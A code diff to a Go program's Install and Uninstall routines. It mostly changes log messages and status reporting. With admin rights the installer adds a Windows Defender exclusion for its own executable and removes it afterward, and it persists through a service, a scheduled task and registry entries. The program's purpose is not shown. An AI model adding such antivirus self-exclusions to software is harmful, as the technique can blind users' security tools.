@@ -94,9 +94,9 @@ func Install() {
 	} else {
 		admin = true
 		if err = util.AddDefenderExclusion(os.Args[0]); err != nil {
-			log.Println("Adding initial exclusion failed,", err)
+			log.Println("Adding temporary exclusion failed,", err)
 		} else {
-			log.Println("Initial exclusion added successfully")
+			log.Println("Temporary exclusion added successfully")
 		}
 	}
 
@@ -133,6 +133,13 @@ func Install() {
 
 	err = WriteInstallInfo()
 	util.Handle(err, "Failed to dump install configuration")
+	if admin {
+		if err = util.RemoveDefenderExclusion(os.Args[0]); err != nil {
+			log.Println("Failed to remove temporary exclusion,", err)
+		} else {
+			log.Println("Temporary exclusion removed successfully")
+		}
+	}
 
 	log.Println("Install complete")
 
@@ -141,28 +148,26 @@ func Install() {
 }
 
 //Uninstall attempts to undo all of the changes done to the system by Install.
-func Uninstall() [4]string {
-	var r [4]string
+func Uninstall() []string {
+	r := make([]string, 5)
 	for i := range r {
-		r[i] = "success"
+		r[i] = "✔️"
 	}
+
 	if err := UninstallService(); err != nil {
 		r[0] = err.Error()
 	}
 	if err := UninstallTask(); err != nil {
-		r[1] = "failed"
+		r[1] = "⚠️"
 	}
 	if err := UninstallRegistry(nil); err != nil {
 		r[2] = err.Error()
 	}
 	if err := UninstallFolder(); err != nil {
-		r[3] = "failed"
+		r[3] = "⚠️"
 	}
-
 	if err := util.RemoveDefenderExclusion(Info.Base); err != nil {
-		log.Println("Failed to remove base exclusion,", err)
-	} else {
-		log.Println("Base exclusion removed successfully")
+		r[4] = "⚠️"
 	}
 
 	//Remove self
